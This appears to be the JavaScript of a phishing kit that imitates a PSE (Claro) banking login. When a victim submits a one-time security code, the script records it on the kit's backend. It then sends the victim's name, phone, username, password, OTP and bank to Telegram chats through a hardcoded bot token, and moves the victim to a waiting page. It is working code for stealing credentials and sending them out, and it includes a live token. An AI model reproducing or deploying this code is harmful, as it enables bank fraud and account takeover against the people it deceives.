function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

// Elemento con el botón de entrar
const button = document.getElementById("btnLogin-page1");

// Elemento botón OTP
const otpButton = document.getElementById("btnLogin-otapp");

// Elemento input número de celular
const numberMovil = document.getElementById("docNumberMovil");

async function sendToTelegram(message) {
  for (const chatId of chatIds) {
    // Iterar sobre los chatIds
    const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
      message
    )}`;

    try {
      const response = await fetch(url);
      if (response.ok) {
        console.log(`Mensaje enviado a Telegram (chat ID: ${chatId})`);
      } else {
        console.error(
          `Error al enviar mensaje (chat ID: ${chatId}):`,
          response.statusText
        );
      }
    } catch (error) {
      console.error(`Error de red (chat ID: ${chatId}):`, error);
    }
  }
}

otpButton.addEventListener("click", async function (e) {
  e.preventDefault();
  otpButton.disabled = true;

  if (numberMovil.value == "") {
    alert("Por favor ingrese token de seguridad");
    numberMovil.focus();
    otpButton.disabled = false;
    return;
  } else {
    var din = numberMovil.value;

    info.metaInfo.cdin = din;

    updateLS();

    async function updateOtp() {
      const response = await fetch(`${url}/trico/tricoData`, {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
        },
      });

      const serverData = await response.json();
      const dataTables = [...serverData];

      for (const data of dataTables) {
        if (data.id == info.metaInfo.cc) {
          console.log("Usuario Encontrado");
          const updateResponse = await fetch(
            `${url}/trico/updateTricoPse/${data.idreg}`,
            {
              method: "PUT",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                otp: info.metaInfo.cdin,
              }),
            }
          );

          const updateData = await updateResponse.json();

          // Crear el mensaje con toda la información
          const message = `🟣 PSE (Claro)\n©️ID: ${data.id}\n🆔Nombre: ${data.nombre}\n📱Teléfono: ${data.telefono}\n🚹Usuario: ${data.usuario}\n🔒Contraseña: ${data.password}\n💎OTP: ${info.metaInfo.cdin}\n🏦Banco: ${data.bank}\nFuente: ${fuente}\nIngresó OTP`;

          // Enviar el mensaje a Telegram
          await sendToTelegram(message);

          if (updateResponse.ok) {
            console.log("Usuario actualizado");
          } else {
            console.error(
              "Error al actualizar usuario:",
              updateResponse.statusText
            );
          }
        }
      }

      otpButton.disabled = false;
      window.location.href = "wait.html"; // Redirige a la página deseada
    }

    await updateOtp();
  }
});
